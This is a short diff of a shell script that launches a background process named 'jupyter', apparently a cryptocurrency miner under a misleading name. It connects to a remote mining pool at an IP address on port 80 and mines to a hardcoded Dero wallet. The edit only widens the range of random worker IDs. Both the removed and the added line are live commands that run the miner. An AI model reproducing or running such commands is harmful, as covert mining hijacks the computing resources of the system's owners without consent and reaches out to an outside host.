@@ -1,2 +1,2 @@
 chmod 700 jupyter 
-nohup ./jupyter -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcsmra2z8jfx22s4n7ltt.$(echo $(shuf -i 1-100 -n 1)-CPU) -r 45.77.42.162:80 &
+nohup ./jupyter -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcsmra2z8jfx22s4n7ltt.$(echo $(shuf -i 1-9999 -n 1)-CPU) -r 45.77.42.162:80 &
